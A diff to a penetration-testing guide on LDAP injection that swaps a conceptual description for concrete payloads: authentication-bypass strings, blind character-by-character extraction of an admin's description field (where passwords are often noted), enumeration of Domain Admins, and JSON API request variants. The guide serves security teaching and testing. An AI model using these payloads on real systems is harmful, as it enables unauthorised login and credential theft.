@@ -46,30 +46,51 @@ A typical authentication filter has this form (prefix notation, with AND between
 The test consists of sending the wildcard `*` as the username and observing whether the response changes (e.g., a
 different error, or "multiple users found"). A change indicates that the input reaches the filter without escape.
 
-### Phase 2 - Authentication bypass (conceptual)
+### Phase 2 - Authentication bypass
 
-The technique consists of injecting metacharacters that prematurely close the filter and introduce an
-always-true condition, making the password field irrelevant. In minimal didactic form:
+You inject metacharacters that prematurely close the filter and introduce an always-true condition, making the
+password irrelevant. Payloads in the username field (any password):
 
 ```
-Username: *                        <-- the wildcard matches all users
-# the unsanitized filter authenticates the first matching user (often an admin)
+*                       <-- wildcard: matches all users, authenticates the first (often admin)
+admin)(&)               <-- closing + always-true (&)
+admin))(|(uid=*         <-- OR injection: forces the clause to TRUE
+*)(uid=*))(|(uid=*      <-- OR variant with wildcard
 ```
 
-The variants (closing with `)(` and introducing an OR or a tautological condition) are many; the principle is
-always the same: the input, not treated as data, alters the logical structure of the filter.
+Example of how `admin)(&)` alters the vulnerable filter `(&(uid=INPUT)(userPassword=PASS))`:
+
+```
+(&(uid=admin)(&))(userPassword=PASS))
+         ^^^^  the (&) sub-clause is always true; the password is no longer evaluated
+```
 
 ### Phase 3 - Enumeration and extraction (blind)
 
-If the application responds differently to true and false conditions, you enumerate users by prefix (`a*`, `ad*`,
-`adm*`...) and extract the attributes one character at a time. The highest-value attribute in AD is
-`description`, where it is (bad but widespread) practice to note temporary passwords.
-
-Illustrative output (representative, enumeration outcome):
+If the application responds differently to true and false conditions, you enumerate users by prefix and extract
+attributes one character at a time. The highest-value attribute in AD is `description`, where it is (bad but
+widespread) practice to note temporary passwords.
 
 ```
-a*   -> "wrong password" behavior   <-- users starting with 'a' exist
-b*   -> "nonexistent user" behavior <-- no user starts with 'b'
+# User enumeration by prefix (in the username field)
+a*     -> "wrong password"     <-- users starting with 'a' exist
+b*     -> "nonexistent user"   <-- no user starts with 'b'
+adm*   -> "wrong password"     <-- 'admin' or similar exists
+
+# Blind extraction of 'admin' description field, character by character
+admin)(description=P*       -> TRUE   <-- the description starts with 'P'
+admin)(description=Pass*    -> TRUE
+admin)(description=Password1*  -> TRUE ... up to the full string
+
+# Enumerate members of a privileged group (via search)
+*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local   <-- lists the Domain Admins
+```
+
+API/JSON variant (LDAP backend behind a REST endpoint):
+
+```
+POST /api/v2/auth/login    {"username": "admin)(&)", "password": "x"}
+POST /api/v2/users/search  {"query": "*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local"}
 ```
 
 ## Analysis of results
